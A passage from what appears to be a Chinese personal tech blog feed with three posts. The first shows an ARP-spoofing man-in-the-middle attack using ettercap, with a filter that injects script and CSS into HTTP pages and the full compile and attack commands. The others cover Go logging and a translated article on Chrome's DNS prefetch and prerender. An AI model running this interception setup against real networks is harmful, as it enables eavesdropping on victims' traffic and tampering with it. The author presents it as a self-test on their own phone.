<p>执行中间人攻击，欺骗路由器和目标设备，这样本来由目标发下路由器的流量就发给了我方网卡，中转后再发向路由器。</p>
<h1 id="0x04__u5BA1_u67E5_u6D41_u91CF_u4FE1_u606F"><a href="#0x04__u5BA1_u67E5_u6D41_u91CF_u4FE1_u606F" class="headerlink" title="0x04 审查流量信息"></a>0x04 审查流量信息</h1><p>配合<code>wireshark</code>审查浏览，不过现在HTTPS加密已经流行起来，似乎只有HTTP明文可以被我们分析了。</p>
<p><img src="/images/try-to-snoop-using-wifi/wireshark.png" alt="wireshark"></p>
<p>似乎到了饭点，在定外卖……</p>
<h1 id="0x05__u4FEE_u6539_u6D41_u91CF_u4FE1_u606F"><a href="#0x05__u4FEE_u6539_u6D41_u91CF_u4FE1_u606F" class="headerlink" title="0x05 修改流量信息"></a>0x05 修改流量信息</h1><p>接下来攻击自己手机，尝试在HTTP明文中注入脚本。</p>
<p>还是使用<code>ettercap</code>，其中的<code>fliter</code>功能可以进行简单的文本查找和替换，虽然十分低效。高效的方法需要加入HTTP解析，这样方便过滤和注入。</p>
<p>fliter代码，</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.dst == 80) &#123;</span><br><span class="line">    if (search(DATA.data, "Accept-Encoding")) &#123;</span><br><span class="line">        replace("Accept-Encoding", "Accept-Nothing"); # 防止GZIP压缩</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123;</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>", "<span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">\"text</span>/<span class="attribute">javascript</span>\"&gt;</span><span class="actionscript">alert(<span class="string">'Hack'</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>","<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="tag">html</span><span class="rules">&#123;<span class="rule"><span class="attribute">overflow-y</span>:<span class="value">scroll</span></span>;<span class="rule"><span class="attribute">filter</span>:<span class="value">progid:DXImageTransform.Microsoft.<span class="function">BasicImage</span>(grayscale=<span class="number">1</span>)</span></span>;<span class="rule"><span class="attribute">-webkit-filter</span>:<span class="value"><span class="function">grayscale</span>(<span class="number">100%</span>)</span></span>;&#125;</span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>预先编译为<code>ettercap</code>可加载的二进制模块，</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">etterfilter f.filter -o <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>重新进行攻击，这时候流量被匹配后修改，</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan0 -<span class="constant">T</span> -<span class="constant">M</span> <span class="symbol">arp:</span>remote -<span class="constant">F</span> <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span> /<span class="number">192.168</span>.<span class="number">31.1</span>/<span class="regexp">/ /</span><span class="number">192.168</span>.<span class="number">31.155</span>/<span class="regexp">/</span><br><span class="line"></span><br><span class="line">```</span></span><br></pre></td></tr></table></figure>
<p>攻击效果，</p>
<p><img src="/images/try-to-snoop-using-wifi/v2ex.jpg" alt="v2ex"></p>
<p>脚本注入</p>
<p><img src="/images/try-to-snoop-using-wifi/smzdm.jpg" alt="smzdm"></p>
<p>哈，灰色默哀</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00__u6298_u817E_u7684_u7F18_u7531"><a href="#0x00__u6298_u817E_u7684_u7F18_u7531" class="headerlink" title="0x00 折腾的缘由"></a>0x00 折]]>
    </summary>
    
      <category term="linux" scheme="http://yqf3139.github.io/tags/linux/"/>
    
      <category term="wifi" scheme="http://yqf3139.github.io/tags/wifi/"/>
    
      <category term="security" scheme="http://yqf3139.github.io/categories/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[养成良好的Log习惯]]></title>
    <link href="http://yqf3139.github.io/2015/12/21/a-good-logging-habit/"/>
    <id>http://yqf3139.github.io/2015/12/21/a-good-logging-habit/</id>
    <published>2015-12-21T10:49:52.000Z</published>
    <updated>2015-12-21T11:43:06.946Z</updated>
    <content type="html"><![CDATA[<h1 id="u4E0D_u597D_u7684Log_u4E60_u60EF_u5E26_u6765_u4E86_u54EA_u4E9B_u95EE_u9898_uFF1F"><a href="#u4E0D_u597D_u7684Log_u4E60_u60EF_u5E26_u6765_u4E86_u54EA_u4E9B_u95EE_u9898_uFF1F" class="headerlink" title="不好的Log习惯带来了哪些问题？"></a>不好的Log习惯带来了哪些问题？</h1><p>通常创新项目初期，我的确不是很注意编码规范，测试以及日志。由于需求和技术实现都不明确，如果太注重测试可能会框住自己的手脚。<strong>不过编码规范和日志是什么项目都应该注意的，一开始注意便能提升整个项目的效率，避免后期重构。</strong></p>
<p>项目各方面逐渐明确后，各种测试也是很重要的一环。在重构之前确定一些自动的回归测试和单元测试，能避免出现很多低级错误，这些错误一旦在集成时出现，可能会花费半天进行调试，最近苦不堪言下定决心改正。</p>
<p>之前打log一般便就是<code>printf</code>大法，总之输出各种变量的值，完全就是debug时的调试，项目后期便会各种调试信息混杂在一起，非得手动注释才行。在log中使用各种“奇技淫巧”，比如输出’=’组成的分割线，使用特殊符号的数量方便搜索，不断地改log、调试、再改，最后调试出了bug，log之后再也看不懂了。</p>
<p>最近问题来了，服务器代码需要发布和部署，后期我也没有机会维护了，重构后的代码虽然可读性好了很多，但log还是一团糟。最后花了一天时间统一了log输出的规范，方便进行fliter，调试起来也开心和效率很多。而且设置断点，单步调试的效率往往比<code>printf</code>大法好很多，应该少使用log进行调试。</p>
<h1 id="u4E00_u4E2A_u5165_u95E8_u7EA7_u522B_u7684log_u89C4_u8303"><a href="#u4E00_u4E2A_u5165_u95E8_u7EA7_u522B_u7684log_u89C4_u8303" class="headerlink" title="一个入门级别的log规范"></a>一个入门级别的log规范</h1><h2 id="Javascript__26amp_3B_26amp_3B_Android"><a href="#Javascript__26amp_3B_26amp_3B_Android" class="headerlink" title="Javascript &amp;&amp; Android"></a>Javascript &amp;&amp; Android</h2><p>框架已经提供了足够好的log工具，<code>console.log/info/warning/error/table</code>自带分级，并且结合Chrome的fliter，十分易用。在代码中加入<code>debugger;</code>便能让Chrome陷入断点，变量查看等都非常方便，Web程序员十分幸福。<br>Android也提供了类似的Logger，设置Tag并分级，Logcat中也可以进行搜索。在JNI开发中，通过<code>#define ALOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,ALOG,__VA_ARGS__)</code>定义宏，也能很方便使用。之前一直通过stdout打印，非常混乱。</p>
<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>最后发现服务器的Log更是乱成一团，所有输出都是<code>printf</code>，不带分级和Tag，看起来混乱且不方便发布。Golang自带的Log包也不存在这些复杂的功能，最后并不想再依赖其他的包，还是简单封装一下为好。</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> logger *log.<span class="type">Logger</span></span><br><span class="line"><span class="keyword">var</span> <span class="type">LogLevel</span> int = <span class="type">INFO</span></span><br><span class="line"></span><br><span class="line"><span class="func"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    logger = log.<span class="type">New</span>(os.<span class="type">Stdout</span>, <span class="string">""</span>, log.<span class="type">LstdFlags</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="func"><span class="keyword">func</span> <span class="title">Debugf</span><span class="params">(tag string, argv ...interface&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="type">LogLevel</span> &lt;= <span class="type">DEBUG</span> &#123;</span><br><span class="line">        logger.<span class="type">Println</span>(<span class="string">"DEBUG: ["</span>+tag+<span class="string">"]"</span>, argv)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从命令行读取log level</span></span><br><span class="line">log_level := flag.<span class="type">Int</span>(<span class="string">"loglevel"</span>, <span class="type">INFO</span>, <span class="string">"the log level"</span>)</span><br><span class="line">webanalyzer.<span class="type">LogLevel</span> = *log_level</span><br><span class="line"></span><br><span class="line"><span class="func"><span class="keyword">func</span> <span class="title">server</span><span class="params">(...)</span></span>&#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="func"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := recover(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">// 在数据处理函数中，接下所有的panic，并将它们发给browser</span></span><br><span class="line">            <span class="comment">// 这样服务器panic后，客户端可以显示一个比较友好的消息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>最后可以通过命令行参数控制log等级，方便发布，可以直接log到文件中，并可以在这里实现一个缓存（计划中），这样混乱的Debug信息部署时就不可见了。</p>
<p>看到其他程序很有条理的log信息，才意识到自己这里做得非常不足，养成这一习惯，应该能提升接下来的开发与调试效率。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="u4E0D_u597D_u7684Log_u4E60_u60EF_u5E26_u6765_u4E86_u54EA_u4E9B_u95EE_u9898_uFF1F"><a href="#u4E0D_u597D_u7684Log_u4E60_u60EF_u5E26_u]]>
    </summary>
    
      <category term="golang" scheme="http://yqf3139.github.io/tags/golang/"/>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="program" scheme="http://yqf3139.github.io/categories/program/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Google Chrome 中的高性能网络技术实践（翻译）下]]></title>
    <link href="http://yqf3139.github.io/2015/12/16/high-perf-network-in-chrome-trans-2/"/>
    <id>http://yqf3139.github.io/2015/12/16/high-perf-network-in-chrome-trans-2/</id>
    <published>2015-12-16T02:54:59.000Z</published>
    <updated>2015-12-19T04:34:14.267Z</updated>
    <content type="html"><![CDATA[<h1 id="u4F60_u4F7F_u7528_u6D4F_u89C8_u5668_u8FDB_u884C_u4F1A_u8BDD_u7684_u5168_u8FC7_u7A0B"><a href="#u4F60_u4F7F_u7528_u6D4F_u89C8_u5668_u8FDB_u884C_u4F1A_u8BDD_u7684_u5168_u8FC7_u7A0B" class="headerlink" title="你使用浏览器进行会话的全过程"></a>你使用浏览器进行会话的全过程</h1><p>通过前文我们已经能在心中绘制出Chrome网络栈的大致图样，现在让我们来详细了解一下浏览器中一系列面向用户的优化。现在，让我们想想我们刚刚创建了一个Chrome的用户档案，并准备开始上网冲浪了。</p>
<h2 id="u4F18_u5316_u6E38_u89C8_u5668_u7684_u51B7_u542F_u52A8_u4F53_u9A8C"><a href="#u4F18_u5316_u6E38_u89C8_u5668_u7684_u51B7_u542F_u52A8_u4F53_u9A8C" class="headerlink" title="优化游览器的冷启动体验"></a>优化游览器的冷启动体验</h2><p><img src="/images/high-perf-network-in-chrome-trans/pagespeed.png" alt="pagespeed"></p>
<p>第一次启动Chrome的时候，它对你喜爱的网站、浏览习惯还了解甚少。但是，<strong>大多数人在浏览器冷启动后还是遵循着一个特定的使用习惯</strong>，比如打开电邮、新闻头条、社交网络和门户网站等等。具体的网站可能不同，但是它们其中的相似性可以帮助预测器来加速你每天一开始打开浏览器的体验！</p>
<p><strong>Chrome总是记着用户打开浏览器后最爱去的十大网站</strong>，不过需要注意的是这并不是全局浏览的前十，而仅仅是启动后的。浏览器加载的时候，Chrome就可以为这些站点发起DNS的预加载。好奇的你可以通过<code>chrome://dns</code>来查看你自己的启动域名列表。在这个网页的最上方，你会找到你账号的十大启动候选网站。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/startup-dns.png" alt="startup-dns"></p>
<p>以我账号举个栗子吧，我一般如何上网的呢？如果我是在写一篇文章的时候，我会直接导航去Google Docs。如你所料，我常去一些Google站点。</p>
<h2 id="u4F18_u5316_u4E0EOmnibox_u7684_u4E92_u52A8"><a href="#u4F18_u5316_u4E0EOmnibox_u7684_u4E92_u52A8" class="headerlink" title="优化与Omnibox的互动"></a>优化与Omnibox的互动</h2><p><img src="/images/high-perf-network-in-chrome-trans/chrome-omnibox.png" alt="chrome-omnibox"></p>
<p>推出Omnibox是Chrome的一大创举，和先前的其他浏览器相比，Chrome的Omnibox可不仅仅只能输入目标URL。除了记住用户之前浏览过的URL以外，它也支持历史浏览记录的全文搜索，<em>(小技巧：输入网站的名称而不是URL)</em>，更可与你选择搜索引擎进行深度整合。</p>
<p>Omnibox会自动相应用户的输入，这可以是根据你历史的一个URL，或者是一个搜索查询。底层实现中，每个提示的动作都是按照和输入的相关程度进行排序，并参考之前的记录。事实上，你可以在<code>chrome://predictors</code>中查询到这些数据。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xomnibox.png" alt="xomnibox"></p>
<p><strong>Chrome记忆着用户输入前缀词的一份历史记录，其提示的动作和成功执行的比例</strong>。对于我的历史来说，可以发现我每次敲入g后，我有76%的机率是向打开Gmail。而当我再输入”m”后(“gm”的缩写)，这一动作的可信率升到了99.8%。事实上，在412次我输入”gm”后，我只有一次并不是想打开Gmail。</p>
<p>但是，你可能会想，这一切关网络栈什么事情？这些黄黄绿绿的候选数据其实都是<code>ResourceDispatcher</code>的重要参考信号！如果我们产生了一个黄色信号，Chrome可能会发出一个DNS预查询。如果是一个绿色的更高可信度的信号，Chrome可能在DNS解析后发出一个TCP预连接。如果这些都做好了，但用户还没有做出决定，Chrome甚至会默默在后台页面渲染好这个网页。</p>
<p>还有一种可能是，如果就历史数据来看，当前输入的查询词没有很好的匹配，那么Chrome会对你搜索引擎进行DNS/TCP预加载，这是预测你很有可能发出一个搜索请求。</p>
<p><strong>对于一般用户来说，他们需要数百毫秒的时间来输入查询，并评估自动弹出的提示</strong>。在后台的Chrome便能从容地预加载、预连接甚至于在某些情况下预渲染这个网页，这样等用户敲击下”enter”键的时候，网络带来的延时影响已经没有了。</p>
<h2 id="u4F18_u5316_u7F13_u5B58_u7684_u6027_u80FD"><a href="#u4F18_u5316_u7F13_u5B58_u7684_u6027_u80FD" class="headerlink" title="优化缓存的性能"></a>优化缓存的性能</h2><p>最快的Request，是这个请求根本没有发生。当我们谈及性能的时候，怎能不谈及缓存呢。作为网站开发人员，你得通过Expires,ETag,Last-Modified和Cache-Control这些<a href="https://developers.google.com/speed/docs/best-practices/caching" target="_blank" rel="external">response headers</a>来表明你服务器上资源文件的缓存状态，对吧？如果没有的话，快行动起来，我们等等没关系。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/chrome-incognito.webp" alt="chrome-incognito"></p>
<p>Chrome对于内部缓存有两种不同的实现：一种是本地磁盘缓存，一种使用内存。<strong>内存缓存是为<a href="http://support.google.com/chrome/bin/answer.py?hl=en&amp;answer=95464" target="_blank" rel="external">incognito浏览模式</a>准备的，当你关闭窗口后，一切干干净净</strong>。两种模式都实现了相同的接口(<code>disk_cache::Backend</code>和<code>disk_cache::Entry</code>)，这极大简化了架构设计。如果你对此有想法，可以很轻易地实验你的缓存实现。</p>
<p>从内部来说，磁盘缓存实现了自有的一套数据结构，它们都存放在你Profile目录下的文件夹中。其中，索引文件在浏览器启动时被直接映射入内存，而数据文件存放真实的数据，比如说HTTP头和其他统计信息。这里值得一提的是，最大不超过16KB的文件都存放在共享的数据块文件中，大文件直接存放在专有文件中。磁盘缓存需要实验LRU测量进行清扫，LRU的通常参考使用频率和资源的年龄。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/internals-cache.png" alt="internals-cache"></p>
<p>如果你对Chrome缓存感兴趣的话，不妨看看<code>chrome://net-internals/#httoCache</code>。如果你想查看实际的HTTP元数据和缓存的Response，你可以访问<code>chrome://cache</code>，它们会列出缓存中所有的资源详情。你可以搜索，并点击URl查看。</p>
<h2 id="u4F7F_u7528_u9884_u52A0_u8F7D_u4F18_u5316DNS"><a href="#u4F7F_u7528_u9884_u52A0_u8F7D_u4F18_u5316DNS" class="headerlink" title="使用预加载优化DNS"></a>使用预加载优化DNS</h2><p>之前我们已经几次提到了DNS预解析，那在我们展开实现细节前，我们看看哪些情况下会触发DNS解析，和触发理由：</p>
<ul>
<li>在Render进程中运行的Blink文档解析器，可以提供其页面的所有URL中的域名，Chrome可以选择预先解析与否。</li>
<li>在用户发出请求之前，Render进程便可能触发一个鼠标悬浮事件，或是一个按钮点击事件。</li>
<li>在高匹配的情况下，Omnibox可能触发一个查询请求。</li>
<li>Chrome预测器在综合历史浏览记录和资源请求数据后，发出域名解析请求。</li>
<li>页面的开发者可以显式告诉Chrome，哪些域名可以预先解析。</li>
</ul>
<p>在所有以上的情况下，DNS预解析都只是被当做暗示来处理。Chrome不保证预解析一定会执行，而是通过综合判断所有的信号，使用预测器来判断是否执行。最“糟糕”的情况下，如果我们不能提前解析DNS，用户就必须要等待一个DNS解析时间，然后才是TCP连接和资源加载。不过，如果这一切发生的话，预测器会进行记录并以此优化未来的决策。这就是你越用，Chrome越快越聪明。</p>
<p>之前我们没有提到的一个优化是，<code>Chrome会发现每个网站的拓扑结构，并用这一信息为未来的浏览加速</code>。让我们回忆一下每个网页平均由88个资源的事实，其中资源从30+个独立的域名加载而来。这说明你每次进行网页浏览的时候，Chrome可以记录下网页上流行的资源文件。在以后它便可选择为一些、或者是全部发出一个DNS预加载和TCP预连接。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xsubresource-stats.png" alt="xsubresource-stats"></p>
<p>你可访问<code>chrome://dns</code>来查看Chrome缓存的子站点的域名，并可以查询一下你关心的域名。上例可看出，对于Google+来说，Chrome记得六个子站点和DNS预解析/TCP预连接的统计数据，其中还有请求的期望值。这一内部的统计数据让Chrome预测器可以进行预测优化。</p>
<p>除了上述的所有内部信号，站点开发者还可以通过以下方式，即嵌入附加的预解析信息来暗示Chrome：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"dns-prefetch"</span> href=<span class="string">"//host_name_to_prefetch.com"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>那让浏览器自动来做不就好了吗？<strong>在某些情况下，可能有预解析一个文章中完全没有提及的域名</strong>。最经典的栗子当然就是跳转了：一个指向域名的链接，就比如一个追踪分析的服务，它功能就是将用户跳转到真实的地址下。Chrome仅仅依靠自己是没有办法做到的，而可以通过人工提供更好。</p>
<p>那么底层实现又是怎样的呢？不过这一答案恐怕和Chrome的版本有关，由于团队<em>总是</em>在实验更新更好的方法。不过整体上来看，Chrome的DNS组织结构有两大实现：之前Chrome使用平台无关的<code>getaddrinfo</code>系统调用，将这个查询全权交由系统进行，而现在逐步替换为<strong>Chrome自实现的异步DNS解析器</strong>。</p>
<p>原本的实现的优点是，由于依赖操作系统，代码可以更简洁，并且还能利用上操作系统的DNS缓存。不过，<code>getaddrinfo()</code>是一个阻塞式的系统调用，这就意味着Chrome得创建并维护一个专有的线程池来进行并行的解析。<strong>这个线程池最大不超过6个worker线程</strong>，这是基于硬件最小公共分母的一个经验值，因为我们发现太高的并行请求会让一些用户的路由器过载！</p>
<p>对于使用worker池的预解析方案，Chrome就简单地调用<code>getaddrinfo()</code>，这会阻塞到response返回，在此之后他就丢弃了返回的结果并转而处理下一个请求。<em>丢弃它？</em>由于结果已经由系统DNS守护进程缓存了，这以后就能立即返回了。这足够简单和有效。</p>
<p><strong>嗯，很有效，但这还远远不够！</strong><code>getaddrinfo()</code>调用并不会告诉Chrome很多有用的信息，比如说每个记录的TTL，和DNS缓存自身的状态。为了提升性能，Chrome团队决定实现一个跨平台、异步的DNS解析器。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xasync-dns.png" alt="xasync-dns"></p>
<p>Chrome自己进行DNS解析带来了以下的新优化：</p>
<ul>
<li>对于重传输计时器更好的控制，并且能并行多个查询</li>
<li>TTL信息可见，这让Chrome可以在失效之前就更新热门的记录</li>
<li>对于IPv4和IPv6更好的支持</li>
<li>基于RTT和其他信号转换去其他的服务器（DNS服务器）</li>
</ul>
<p>以上，乃至还有更多，都是来源于Chrome持续不断的实验和优化。一个更加明显的问题是：<em>我们是如何验证这些想法的效果的呢？</em>，这很简单，Chrome对于每个用户，都对网络性能进行了细致的追踪和记录。你可以打开<code>chrome://histograms/DNS</code>来查看这些信息。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xdns-prefetch.png" alt="xdns-prefetch"></p>
<p>上图显示了DNS预请求的时间延时分布情况：差不多半成的（右栏）都是在20毫秒内完成的（左栏）。这是基于最近的一次浏览回话（9869条记录）并为用户私有。如果用户选择向Chrome提交他们的使用情况数据的话，这些数据才会被匿名化后，周期性地提交到开发团队，这样我们就能看到试验成功并不断做出调整了。就这样反复迭代更新。</p>
<h2 id="u4F7F_u7528_u9884_u8FDE_u63A5_u6765_u4F18_u5316_u7BA1_u7406TCP_u8FDE_u63A5"><a href="#u4F7F_u7528_u9884_u8FDE_u63A5_u6765_u4F18_u5316_u7BA1_u7406TCP_u8FDE_u63A5" class="headerlink" title="使用预连接来优化管理TCP连接"></a>使用预连接来优化管理TCP连接</h2><p>既然我们通过Omnibox和Chrome预测器猜测出了接下来用户的导航方向，并预先解析出了域名，<strong>那为什么不再提前一步，预先与目标域名建立TCP连接，在用户发出真实的请求前就完成TCP握手呢？</strong>这样的话，我们便又节省了一个完整的Roundtrip时延，为用户节省了数百毫秒的延时。这便是TCP预连接和它的工作原理了。</p>
<p>首先，Chrome会先检查其socket池，找找有没有此域名的可用的socket。重用已经保持一段时间的keep-alive的sockets可以防止TCP握手和慢启动惩罚。如果没有可用的socket，那再启动TCP握手，并将它放到池中。这样的话，当用户启动导航的时候，真实的HTTP请求就能立即发送出去了。</p>
<p>打开<code>chrome://net-internals#sockets</code>来查看Chrome中打开的socket详情统计。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xnetinternals-sockets.png" alt="xnetinternals-sockets"></p>
<p>你还可以深入每个socket的详情并审查时间线：连接和代理时间，每个包的到达时间等等。你还可以将数据导出，用于离线分析和bug报告。<strong>一个好审视(instrumentation)系统的是性能优化的关键，而<code>chrome://net-internals</code>是Chrome网络的汇总点</strong>，如果你还没尝试它的话快去试试吧。</p>
<h2 id="u4F7F_u7528_u9884_u52A0_u8F7D_u63D0_u5347_u6765_u4F18_u5316_u8D44_u6E90_u52A0_u8F7D"><a href="#u4F7F_u7528_u9884_u52A0_u8F7D_u63D0_u5347_u6765_u4F18_u5316_u8D44_u6E90_u52A0_u8F7D" class="headerlink" title="使用预加载提升来优化资源加载"></a>使用预加载提升来优化资源加载</h2><p>有时，网页开发者基于站点的布局信息，可以提供附加的导航信息，或是page context(不知原文所指)。这能帮助浏览器优化用户体验。Chrome支持以下两种提示，内嵌在网页中即可：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"subresource"</span> href=<span class="string">"/javascript/myapp.js"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"prefetch"</span>    href=<span class="string">"/images/big.jpeg"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>子资源和预加载看起来没有什么不同，但却有着非常不同的语义。当一个链接声明自己与当前网页的关系是”prefetch”的时候，这只是暗示浏览器它是一个可能在未来需要打开的页面。换句话说，它只是一个跨页面提示。对比来看，”subresource”提示浏览器本资源是可能会被用于当前页面的，这需要在遇到这个资源之前发出request。</p>
<p>如你所料，不同的语义也带来了资源加载器非常不同的行为。标注为prefetch的资源只是被赋予低优先级，只有在本页面结束加载后才会考虑。而subresource资源则一遇到就加载，优先级很高。</p>
<p>这两个提示，如果在合适的环境下正确使用，可以显著地优化你站点的用户体验。最后，要提示大家prefetch是<a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/links.html#link-type-prefetch" target="_blank" rel="external">HTML5标准的一部分</a>，现已经获得了Firefox和Chrome的支持，而subresource只是在Chrome中支持。（此信息可能已经过期）</p>
<h2 id="u4F7F_u7528_u6D4F_u89C8_u5668_u9884_u5237_u65B0_u6765_u4F18_u5316_u8D44_u6E90_u52A0_u8F7D"><a href="#u4F7F_u7528_u6D4F_u89C8_u5668_u9884_u5237_u65B0_u6765_u4F18_u5316_u8D44_u6E90_u52A0_u8F7D" class="headerlink" title="使用浏览器预刷新来优化资源加载"></a>使用浏览器预刷新来优化资源加载</h2><p>不幸的是，不是所有的站点开发人员都可以或是愿意在网页标注出subresource。就算他们这么做了，我们必须等待HTML文档返回，才能解析到这些提示，并开始获取必要的subresource。这就要看服务器的响应时间，和延时了。通常数百甚至上千的延时都有可能出现。</p>
<p>但是，让我们眼光再放得长远一些，Chrome已经知道了热门资源的域名，并以此进行DNS的预解析。为什么我们不再向前推进一步，进行DNS查询，使用TCP预连接，并推测性地预先加载资源呢？这便是”预刷新”想做的。</p>
<ul>
<li>用户打开目标URL</li>
<li>Chrome查询预测器，得到和目标URL相关的子资源，并也开始DNS预解析-TCP预连接-资源预刷新</li>
<li>如果子资源已经缓存，那么只要从磁盘或是内存中加载就好</li>
<li>如果资源缺失，或是缓存到期，那么才发出网络请求</li>
</ul>
<p><img src="/images/high-perf-network-in-chrome-trans/xchrome-experiment.png" alt="xchrome-experiment"></p>
<p>资源预刷新是Chrome中性能优化的一个典型范例，理论上来说，它应该能带来更好的性能，不过这其中还是有很多折衷。只要一种方式来选择是否需要将这个功能融合入Chrome，就是实现它并在pre-release的Chrome中给实际用户、实际的网络和实际的浏览中进行A/B测试。</p>
<p>在2013年早期，Chrome团队就已经在讨论这一实现。如果收集的反馈好，我们就可以在2013年后期看到这一功能。<strong>提升Chrome网络性能的脚步从未停止，团队一直在尝试新的方法、想法和技术</strong>。</p>
<h2 id="u4F7F_u7528_u9884_u6E32_u67D3_u4F18_u5316_u6D4F_u89C8_u4F53_u9A8C"><a href="#u4F7F_u7528_u9884_u6E32_u67D3_u4F18_u5316_u6D4F_u89C8_u4F53_u9A8C" class="headerlink" title="使用预渲染优化浏览体验"></a>使用预渲染优化浏览体验</h2><p>我们以上提及的每一个优化都减少了用户真实请求发出的时间，最终让页面得以渲染。但是，<strong>一个真实的秒开的体验还需要什么呢？</strong>基于我们之前预先看到的UX数据，互动必须在100ms中结束，这便不给网络延时留多少空余时间了，我们要怎样才能在100ms中渲染好一个页面呢？</p>
<p>当然，你应该已经猜到了答案。这通常是大多数人的习惯：如果你打开了很多网页，并在其中切换，这就是秒开的体验，可比等待加载快多了。如果浏览器已经为你提供了API来这么做呢？</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"prerender"</span> href=<span class="string">"http://example.org/index.html"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>你猜对了，这边是<a href="https://developers.google.com/chrome/whitepapers/prerender" target="_blank" rel="external">Chrome中的预渲染</a>。不像”prefetch”只是下载一个资源，”prerender”提示Chrome在加载其所有subresource后，在一个隐藏的标签页中渲染这个页面。<strong>隐藏的tab是不为用户所见的，但当用户触发导航的时候，此tab就被从后台交换出来，形成所谓的”秒开”</strong>。</p>
